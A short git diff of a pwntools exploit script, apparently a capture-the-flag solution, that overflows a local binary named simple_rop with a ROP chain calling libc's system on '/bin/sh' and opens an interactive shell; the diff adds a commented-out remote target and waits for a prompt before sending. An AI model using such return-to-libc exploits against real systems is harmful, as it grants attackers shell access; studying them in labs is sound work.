@@ -9,6 +9,7 @@ from pwn import *
 # print(rop.rdi)
 
 p = process("./simple_rop")
+# p = remote("rev.danissimurr.ru", 1344)
 
 pop_rdi = 0x40117e
 offset_binsh = 0x1d8678
@@ -17,5 +18,5 @@ libc = 0x00007ffff7c00000
 system = libc + offset_system
 binsh = libc + offset_binsh
 ret = 0x40120b
-p.sendline(b'A'*40 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system))
+p.sendlineafter(b"Hello dude!\n", b'A'*40 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system))
 p.interactive()
